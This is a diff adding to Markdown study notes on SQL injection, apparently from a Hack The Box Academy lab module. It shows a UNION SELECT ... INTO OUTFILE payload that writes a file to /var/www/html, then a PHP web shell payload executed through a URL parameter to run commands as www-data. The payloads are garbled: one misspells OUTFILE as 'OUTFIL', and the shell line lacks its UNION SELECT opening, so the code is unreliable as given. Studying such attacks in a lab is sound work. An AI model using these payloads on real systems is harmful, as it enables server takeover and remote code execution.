@@ -91,3 +91,25 @@ If none of these are working, you can do an online search to seek out additional
 Fuzzing can be used to scan locations and attempt file writing to different potential web roots by using Linux and Windows wordlists.
 
 If all else fails, you can attempt to use server error output to try and discover the base web directory.
+
+Here is an example injection that would achieve the above for our module:
+
+>cn' UNION SELECT 1, 'file written successfully!', 3, 4 INTO OUTFIL '/var/www/html/proof.txt'-- -
+
+When this is submitted, no errors are returned and the query has been successfully injected. You can now check the file proof.txt to confirm it's existence. In the output you can see that the numbers 1, 3, and 4 are included because all junk data we submitted was written to the file. If you wanted to remove the numbers in output, you could replace them with a set of double quotes ("").
+
+### Web Shell
+
+Now you can write a PHP web shell to the webroot folder with the following PHP command, which will execute directly to the back-end:
+
+>\<?php system($\_REQUEST\[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
+
+This will return no errors meaning that we likely were able to write to the file.
+
+You can verify the successful write by examining the /shell.php file and executing commands via the 0 parameter by using the ?0=id snippet from the URL.
+
+This will output the id confirming that we are able to execute code and operate as the www-data user.
+
+### Related:
+- [Hack The Box Academy](https://academy.hackthebox.com/ "Hack The Box Academy Home page")
+- [HTB Writing Files via Injection](https://academy.hackthebox.com/module/33/section/793 "HTB Writing Files via Injection")
